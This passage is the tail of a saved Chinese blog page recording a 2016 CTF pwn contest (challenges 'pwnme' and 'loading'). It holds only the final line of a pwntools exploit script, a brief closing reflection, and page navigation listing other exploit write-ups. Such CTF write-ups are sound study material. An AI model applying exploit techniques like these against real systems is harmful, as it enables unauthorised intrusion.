class="line">r.interactive()</div></pre></td></tr></table></figure>
+<h4 id="感言"><a class="headerlink" href="#感言" title="感言"></a>感言</h4><p>这个比赛让我感觉收获最大的应该是“思考”:<code>要学会自己思考，不然做再多题目都没有用。</code></p>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2016/11/07/Baiudu杯-pwn专场记录/">Baiudu杯 pwn专场记录</a></p>
+<p><span>文章作者:</span><a href="/" title="访问 muhe 的个人博客">muhe</a></p>
+<p><span>发布时间:</span>2016年11月07日 - 17时07分</p>
+<p><span>最后更新:</span>2016年11月07日 - 17时43分</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2016/11/07/Baiudu杯-pwn专场记录/" title="Baiudu杯 pwn专场记录">http://o0xmuhe.me/2016/11/07/Baiudu杯-pwn专场记录/</a>
+<span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2016/11/07/Baiudu杯-pwn专场记录/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/clipboard.min.js"></script>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="license" target="_blank" title="中国大陆 (CC BY-NC-SA 3.0 CN)">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<a class="article-nav-link-wrap" href="/2016/11/10/linux-下起shell失败的分析/" id="article-nav-newer">
+<strong class="article-nav-caption">&lt;</strong>
+<div class="article-nav-title">
+        
+          linux 下起shell失败的分析
+        
+      </div>
+</a>
+<a class="article-nav-link-wrap" href="/2016/10/29/how-to-compile-WinAFL/" id="article-nav-older">
+<div class="article-nav-title">how to compile WinAFL</div>
+<strong class="article-nav-caption">&gt;</strong>
+</a>
+</nav>
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-pwnme"><span class="toc-number">2.</span> <span class="toc-text">1.pwnme</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-loading"><span class="toc-number">3.</span> <span class="toc-text">2.loading</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#感言"><span class="toc-number">4.</span> <span class="toc-text">感言</span></a></li></ol>
+</div>
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+<div class="bdsharebuttonbox">
+<a class="fx fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fx fa-weixin bds_weixin" data-cmd="weixin" href="#" title="分享到微信"></a>
+<a class="fx fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享到QQ好友"></a>
+<a class="fx fa-facebook-official bds_fbook" data-cmd="fbook" href="#" title="分享到Facebook"></a>
+<a class="fx fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到Twitter"></a>
+<a class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" href="#" title="分享到linkedin"></a>
+<a class="fx fa-files-o bds_copy" data-cmd="copy" href="#" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+<div class="duoshuo" id="comments">
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="2016/11/07/Baiudu杯-pwn专场记录/" data-title="Baiudu杯 pwn专场记录" data-url="http://o0xmuhe.me/2016/11/07/Baiudu杯-pwn专场记录/"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    var duoshuoQuery = {short_name:"o0xmuhe"};
+    (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '/js/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+    </script>
+<!-- 多说公共JS代码 end -->
+</div>
+<div class="scroll" id="post-nav-button">
+<a href="/2016/11/10/linux-下起shell失败的分析/" title="上一篇: linux 下起shell失败的分析">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2016/10/29/how-to-compile-WinAFL/" title="下一篇: how to compile WinAFL">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/08/SSCTF-2017部分Writeup/">SSCTF-2017部分Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/22/360春秋CTF-pwn/">360春秋CTF--pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/Linux-Kernel-Exploit-4-beginners/">Linux Kernel Exploit 4 beginners</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/NJCTF-2017部分wp/">NJCTF-2017部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/06/SECCON-2016-jmper/">SECCON-2016 jmper</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/04/codegate2017-angrybird/">codegate2017-angrybird</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/LLVM-Study-Log/">LLVM Study Log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/ichunqiu-CTF-2017-2/">ichunqiu-CTF-2017-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/08/Adding-your-own-syscall-in-linux-kernel/">Adding your own syscall in linux kernel</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/04/Windows-Kernel-Exploit-Study-3/">Windows-Kernel-Exploit-Study(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/30/Linux socket进程间通信及应用/">Linux socket进程间通信及应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/28/一点碎碎念/">一点碎碎念</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/22/Have-fun-with-Blind-ROP/">Have fun with Blind ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/20/Windows-Kernel-Exploit-Study-2/">Windows Kernel Exploit Study(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/Windows-Kernel-Exploit-Study-1/">Windows Kernel Exploit Study(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/what-DynELF-does-basically/">what DynELF does basically</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/17/fuzzing-with-peach-Just-a-toy/">fuzzing with peach(Just a toy)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/25/PlaidCTF-2016-butterfly/">PlaidCTF 2016 butterfly</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/Have-fun-with-glibc内存管理/">Have fun with glibc内存管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/10/linux-下起shell失败的分析/">linux 下起shell失败的分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/07/Baiudu杯-pwn专场记录/">Baiudu杯 pwn专场记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/29/how-to-compile-WinAFL/">how to compile WinAFL</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/25/yocto-writeup/">yocto writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/HITCON-2016-Quals-SecretHolder/">HITCON-2016-Quals-SecretHolder</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/CVE-2012-4792学习/">CVE-2012-4792学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/06/一点感悟/">一点感悟</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/BCTF-cloud/">BCTF--cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/一些环境配置遇到的坑-持续更新/">一些环境配置遇到的坑(持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/16/Malloc-Maleficarum-复盘/">Malloc-Maleficarum-复盘</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/26/初试winafl/">初试winafl</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/14/pwnable-kr-alloca/">pwnable.kr -- alloca</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/简单的尝试angr/">简单的尝试angr</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/第一个android-cm调试分析/">第一个android cm调试分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/install-gef/">install gef</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/30/cctf-pwn350/">cctf pwn350</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/15/heap-vuln-unlink/">heap vuln -- unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/02/format-string-with-stack-frame/">format string with stack frame</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/16/RCTF-PWN200/">RCTF -- PWN200</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/05/dragon/">dragon</a></li></ul>
+<script src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+<script>
+</script>
+</div>
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+                © 2017 muhe
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit">访客数量: 
+                            <span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>, </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+</div>
+</div>
+</footer>
+</div>
+<script src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/main.js"></script>
+<script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+<div class="scroll" id="scroll">
+<a href="#"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments"><i class="fa fa-comments-o"></i></a>
+<a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+<script async="" src="./Baiudu杯 pwn专场记录  o0xmuhe's blog/busuanzi.pure.mini.js">
+</script>
+<script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+</div>
+</body>
+</html>
